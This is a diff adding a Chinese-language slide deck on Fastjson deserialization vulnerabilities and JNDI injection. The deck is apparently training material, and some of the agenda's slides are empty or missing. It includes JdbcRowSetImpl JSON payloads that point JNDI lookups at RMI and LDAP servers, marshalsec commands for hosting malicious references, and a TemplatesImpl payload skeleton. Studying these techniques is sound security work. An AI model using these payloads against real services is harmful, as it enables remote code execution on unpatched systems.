@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Fastjson漏洞专题</title>
+        <meta charset="utf-8" />
+        <style>
+            @import url(https://fonts.googleapis.com/css?family=Yanone + Kaffeesatz);
+            @import url(
+                https://fonts.googleapis.com/css?family=Droid + Serif:400,
+                700,
+                400italic
+            );
+            @import url(
+                https://fonts.googleapis.com/css?family=Ubuntu + Mono:400,
+                700,
+                400italic
+            );
+
+            body {
+                font-family: "Droid Serif";
+            }
+            h1,
+            h2,
+            h3 {
+                font-family: "Yanone Kaffeesatz";
+                font-weight: normal;
+            }
+            .remark-code,
+            .remark-inline-code {
+                font-family: "Ubuntu Mono";
+            }
+            .image-scale img {
+                max-width: 100%;
+                max-height: 100%;
+                display: block;
+                margin: auto;
+            }
+        </style>
+    </head>
+    <body>
+        <textarea id="source">
+class: center, middle
+
+# /fastjson/ 反序列化漏洞专题
+
+.footnote[[*] Miao Jiahao / 2020.4.7]
+
+---
+
+# Agenda
+
+1. 知识铺垫
+    * Java中的序列化与反序列化
+    * JNDI与JNDI注入
+    * RMI, LDAP, JDNI
+2. Fastjson介绍
+3. Fastjson序列化与反序列化规则
+4. Fastjson漏洞发展历程及利用
+    * version 1.2.24 & 6种POC
+    * version 1.2.25 黑名单机制与绕过
+    * version 1.2.42 补丁与绕过
+    * version 1.2.44 补丁与绕过
+    * version 1.2.46 补丁与绕过
+5. Fastjson漏洞的未来
+
+---
+## Java中的序列化与反序列化
+
+--
+
+什么是序列化与反序列化
+--
+
+* 序列化：将Java对象写入到IO流并转换成字节序列（byte数组）
+* 反序列化：从字节序列还原回Java对象
+
+--
+
+为什么需要序列化与反序列化
+
+--
+
+* 需要储存和还原对象状态
+* 需要在网络、进程之间进行传输
+* JSON/XML等数据交互格式不能满足复杂数据类型的传输需要
+
+---
+
+Serialization
+```java
+*public class SerializationDemo implements Serializable {
+    private String stringField;
+    private int intField;
+
+    public SerializationDemo(String s, int i) {
+        this.stringField = s;
+        this.intField = i;
+    }
+
+    public static void main(String[] args) throws IOException {
+        ByteArrayOutputStream bout = new ByteArrayOutputStream();
+        ObjectOutputStream out = new ObjectOutputStream(bout);
+*       out.writeObject(new SerializationDemo("gyyyy", 97777));
+    }
+}
+```
+
+---
+Deserialization
+```java
+*public static void main(String[] args) throws ClassNotFoundException {
+    byte[] data; // read from file or request
+    ByteArrayInputStream bin = new ByteArrayInputStream(data);
+    ObjectInputStream in = new ObjectInputStream(bin);
+*   SerializationDemo demo = (SerializationDemo) in.readObject();
+}
+```
+Java的反序列化漏洞出现在`readObject()`中，但并不是今天的重点
+
+Fastjson自身没有使用Java的序列化/反序列化机制，而是自己实现了一套规则
+
+---
+## JNDI
+* JNDI => Java Naming and Directory Interface
+* Naming Service => (key, value) -> DNS, File System
+* Directory Service => (key, directory objects) -> LDAP
+
+JNDI是一套接口，类似于索引中心。JNDI允许客户端通过name发现和查找数据以及对象
+
+这些对象可以存储在不同的服务中，例如：
+* 远程方法调用（RMI）
+* 通用对象请求代理体系结构（CORBA）
+* 轻型目录访问协议（LDAP）
+* 域名服务（DNS）
+
+.footnote[[*] Blackhat 2016 - A Journey From JNDI LDAP Manipulation To RCE]
+---
+注册一个资源
+```java
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.Reference;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class Server {
+    public static void main(String[] args) throws Exception {
+*        Registry registry = LocateRegistry.createRegistry(1099);
+*        Reference aa = new Reference("ExecTest", "ExecTest", "http://127.0.0.1:8081");
+        ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);
+        registry.bind("aa", refObjWrapper);
+    }
+}
+```
+.footnote[[*] 事实上可以注册两种资源类型：远程对象、远程对象的引用（Reference）]
+
+.footnote[[*] 当前代码的含义为当查询"aa"时，返回ExecTest类，地址为http://127.0.0.1:8081]
+---
+查询资源
+```java
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import java.util.Hashtable;
+
+public class Client {
+    public static void main(String[] args) throws Exception{
+        Hashtable env = new Hashtable();
+        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
+        env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099");
+*        String uri = "rmi://127.0.0.1:1099/aa";
+        Context ctx = new InitialContext(env);
+*        ctx.lookup(uri);
+    }
+}
+```
+
+---
+当lookup的参数被控制...
+.image-scale[![](./img/image-20200404220558086.png)]
+
+---
+为什么会造成命令执行
+
+--
+
+```java
+Exception in thread "main" javax.naming.NamingException [Root exception is java.lang.ClassCastException: ExecTest cannot be cast to javax.naming.spi.ObjectFactory]
+*	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:507)
+	at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)
+*	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
+	at javax.naming.InitialContext.lookup(InitialContext.java:417)
+	at Client.main(Client.java:9)
+Caused by: java.lang.ClassCastException: ExecTest cannot be cast to javax.naming.spi.ObjectFactory
+	at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163)
+	at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:319)
+	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:499)
+    ... 4 more
+```
+
+---
+```java
+// com.sun.jndi.rmi.registry.RegistryContext.java
+private Object decodeObject(Remote var1, Name var2) throws NamingException {
+    try {
+        Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
+        Reference var8 = null;
+*        if (var3 instanceof Reference) {
+            var8 = (Reference)var3;
+        } else if (var3 instanceof Referenceable) {
+            var8 = ((Referenceable)((Referenceable)var3)).getReference();
+        }
+        if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) {
+            throw new ConfigurationException("The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.");
+        } else {
+*            return NamingManager.getObjectInstance(var3, var2, this, this.environment);
+        }
+    } catch (NamingException var5) {
+        throw var5;
+    } catch (RemoteException var6) {
+        throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
+    } catch (Exception var7) {
+        NamingException var4 = new NamingException();
+        var4.setRootCause(var7);
+        throw var4;
+    }
+}
+```
+---
+```java
+// NamingManager.class
+if (ref != null) {
+            String f = ref.getFactoryClassName();
+            if (f != null) {
+*                factory = getObjectFactoryFromReference(ref, f); // 恶意类的构造器和静态方法在此执行
+                if (factory != null) {
+*                    return factory.getObjectInstance(ref, name, nameCtx,
+                                                     environment); // 恶意类的getObjectInstance方法在此执行（Override）
+                }
+                return refInfo;
+            } else {
+                answer = processURLAddrs(ref, name, nameCtx, environment);
+                if (answer != null) {
+                    return answer;
+                }
+            }
+        }
+```
+这里有两条路径：
+1. 进入`getObjectFactoryFromReference()`后会从加载类，引起构造器和静态方法执行
+2. 在获取类后，会调用`getObjectInstance()`方法，如果被复写则会造成命令执行
+
+---
+最后跟进到`getObjectFactoryFromReference()`看下
+
+.image-scale[![](./img/image-20200404232052152.png)]
+
+---
+
+## JNDI的协议动态切换
+
+```java
+// client
+Hashtable env = new Hashtable();
+        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
+*        env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1389");
+        System.getProperties().setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+        System.getProperties().setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
+*        String uri = "ldap://localhost:1389/obj";
+        Context ctx = new InitialContext(env);
+        ctx.lookup(uri);
+```
+
+.footnote[[*] 如果传参时与初始化选择的上下文环境不一致，JNDI会自动切换上下文]
+
+---
+## 快速开启RMI/LDAP/...服务
+
+LDAP
+```shell
+shell$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/\#ExecTest
+```
+
+RMI
+```shell
+shell$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8081/\#ExecTest
+```
+
+.footnote[[*] Marshalsec - https://github.com/mbechler/marshalsec]
+
+---
+## Fastjson介绍
+
+fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean
+
+API
+```java
+String text = JSON.toJSONString(obj); //序列化
+Vo vo = JSON.parseObject("{...}", VO.class); //反序列化
+```
+
+JSON
+```JSON
+{"name":"anakin","prop":{"foo":"bar"},"sex":"male"}
+```
+
+.footnote[[*] JSON.parse()和JSON.parseObject()有少许差异]
+
+---
+
+## Fastjson序列化
+
+Fastjson的序列化是将Java对象转化成JSON字符串的过程，这一过程中将会：
+
+1. 调用构造器
+2. 调用同时满足以下条件的getter方法：
+    * 非静态
+    * 返回值不为空
+    * 不返回classLoader
+    * 方法名非getMetaClass
+    * 符合getter命名规范
+3. 如果有public属性非空，写入到JSON字符串
+
+```java
+User user = new User();
+        user.name = "anakin";
+        user.age = 25;                                         =>             {"name":"anakin","prop":{"foo":"bar"}}
+        user.prop.setProperty("foo", "bar");
+String jsonString = JSON.toJSONString(user);
+System.out.println(jsonString);
+```
+
+---
+## Fastjson反序列化
+
+反序列化过程中将：
+1. 调用同时满足以下条件的setter方法：
+    * 非静态
+    * 返回值为空
+    * 入参数量为1
+    * 符合setter命名规范
+2. 调用同时满足以下条件的特定的getter方法：
+    * 符合getter命名规范
+    * 是Collection||Map||AtomicBoolean||AtomicInteger||AtomicLong中某个类的子类
+    * 有getter方法但无setter方法
+3. 如果key-value中有对应到java对象的public属性，为其赋值
+
+```java
+String jsonstr = "{\"@type\":\"person.User\", \"name\":\"Tom\", \"age\": 13, \"prop\":{\"foo\":\"bar\"}}";
+Object obj = JSON.parseObject(jsonStr, User.class);
+```
+
+
+Fastjson的一系列漏洞，都出现在自动调用的setter和getter方法中
+
+.footnote[[*] 为什么在反序列化过程中要调用getter方法？]
+
+---
+```java
+private Properties prop = new Properties();
+public Properties getProp(){
+    System.out.println("getProp() is called");
+    return this.prop;
+}
+```
+当存在Properties属性时（Map的子类），由于该属性本身是一个存放数据的容器，不会有setter方法
+
+Fastjson为了让数据不丢失，主动封装了一层，最终其实还是赋值操作
+
+.image-scale[![](./img/787DB4D6-09BD-4E36-9B4A-4EBB50197A5A-5978764.png)]
+
+---
+### JSON.parse() & JSON.parseObject()
+在实际使用时这两个API会有一些差异，本质上parseObject是要调用parse进行反序列化，但parseObject会额外的将java对象转化为JSONObject对象，因此：
+
+1. parse会调用目标类setter方法、特定条件的getter方法
+2. parseObject调用反序列化目标类的所有setter和getter方法
+
+---
+## 第一个漏洞 version 1.2.24
+
+* 对反序列化的类没有限制
+* 出现了多种利用方式
+    * RMI Remote Object Payload
+    * RMI JNDI Reference Payload
+    * LDAP JNDI Reference Payload
+    * RMI BeanFactory
+    * LDAP Java Serialized Data
+    * 特殊类形成gadget
+
+---
+## RMI Remote Object Payload
+
+攻击者实现一个恶意远程对象并绑定在RMI Registry上，编译后的远程对象放在HTTP/FTP/SMB服务器上
+
+限制条件：
+1. RMI客户端上下文环境允许访问Codebase
+2. 属性java.rmi.server.useCodebaseOnly的值必需为false
+
+JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly的默认值就是true，此时只能从CLASSPATH和当前的Codebase加载类
+
+.footnote[[*] 限制条件多，不常使用]
+
+---
+## RMI JNDI Reference Payload
+
+攻击者通过RMI服务返回一个JNDI Naming Reference，受害者解码Reference时会到我们指定的Codebase远程地址加载Factory类
+
+Payload
+```json
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/ExexTest","autoCommit":true}
+```
+
+利用核心：com.sun.rowset.JdbcRowSetImpl类
+
+设置autoCommit属性时会触发setter方法
+```java
+public void setAutoCommit(boolean var1) throws SQLException {
+    if (this.conn != null) {
+        this.conn.setAutoCommit(var1);
+    } else {
+*        this.conn = this.connect();
+        this.conn.setAutoCommit(var1);
+    }
+
+}
+```
+
+---
+
+this.connect()
+```java
+private Connection connect() throws SQLException {
+    if (this.conn != null) {
+        return this.conn;
+    } else if (this.getDataSourceName() != null) {
+        try {
+            InitialContext var1 = new InitialContext();
+*            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
+            return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
+        } catch (NamingException var3) {
+            throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
+        }
+    } else {
+        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
+    }
+}
+```
+JNDI注入
+
+---
+## LDAP JNDI Reference Payload
+
+使用marshalsec开启LDAP服务
+```shell
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/\#ExecTest
+```
+Payload
+```json
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true}
+```
+核心点：JNDI注入时存在协议动态切换特性
+
+.footnote[[*] RMI和LDAP协议有何差异]
+---
+## 插曲：JDK版本对RMI和LDAP的限制
+
+* RMI: JDK在6u132, 7u122, 8u113开始对JNDI Reference远程加载Object Factory类做了限制
+    * com.sun.jndi.rmi.object.trustURLCodebase => default: false
+    * com.sun.jndi.cosnaming.object.trustURLCodebase => default: false
+
+* LDAP: OracleJDK 11.0.1, JDK 8u191, JDK 6u221开始进行限制
+    * com.sun.jndi.ldap.object.trustURLCodebase => default: false
+
+利用RMI返回Reference和利用LDAP返回Reference是两套接口，因此针对RMI的修复方案对LDAP无效
+
+结论：LDAP协议适用性更广，命中可能性更高
+
+---
+## RMI BeanFactory
+
+---
+## LDAP Java Serialized Data
+
+---
+## 特殊类
+
+利用类本身的特性来实现命令执行
+
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl利用链
+
+Payload
+```json
+{
+	"@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+	"_bytecodes": ["..."], // base64编码的class文件
+	"_name": "a.b",
+	"_tfactory": {},
+	"_outputProperties": {}
+}
+```
+
+---
+
+        </textarea>
+        <script src="https://remarkjs.com/downloads/remark-latest.min.js"></script>
+        <script>
+            var slideshow = remark.create({
+                ratio: "16:9",
+                highlightLines: true,
+            });
+        </script>
+    </body>
+</html>
